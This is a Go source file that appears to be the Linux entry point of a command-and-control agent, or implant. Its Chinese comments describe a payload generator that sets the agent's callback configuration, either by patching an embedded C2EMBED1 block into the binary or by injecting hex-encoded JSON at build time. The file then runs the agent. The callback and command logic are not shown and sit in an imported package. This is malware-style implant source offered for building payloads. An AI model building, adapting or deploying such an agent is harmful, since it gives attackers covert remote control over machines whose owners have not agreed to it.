//go:build linux

package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"

	"c2/internal/linuxagent"
)

// cfgHex 由载荷生成器通过 -ldflags -X 注入（BootConfig 的 JSON 再 hex）；与 C2EMBED1 修补二选一。
var cfgHex string

func main() {
	_ = c2ExecutableEmbedBlock[0]

	if bc, ok := linuxagent.TryBootConfigFromExe(); ok {
		_ = linuxagent.Run(bc)
		return
	}

	if cfgHex == "" {
		fmt.Fprintln(os.Stderr, "[c2-agent] FATAL: 未配置回连：ELF 需经载荷生成修补 C2EMBED1，或使用 -ldflags 注入 cfgHex。")
		os.Exit(1)
	}
	raw, err := hex.DecodeString(cfgHex)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[c2-agent] FATAL: config hex decode: %v\n", err)
		os.Exit(1)
	}
	if len(raw) == 0 {
		fmt.Fprintln(os.Stderr, "[c2-agent] FATAL: config hex decodes to empty bytes")
		os.Exit(1)
	}
	var bc linuxagent.BootConfig
	if err := json.Unmarshal(raw, &bc); err != nil {
		fmt.Fprintf(os.Stderr, "[c2-agent] FATAL: config json: %v\n", err)
		os.Exit(1)
	}
	_ = linuxagent.Run(bc)
}
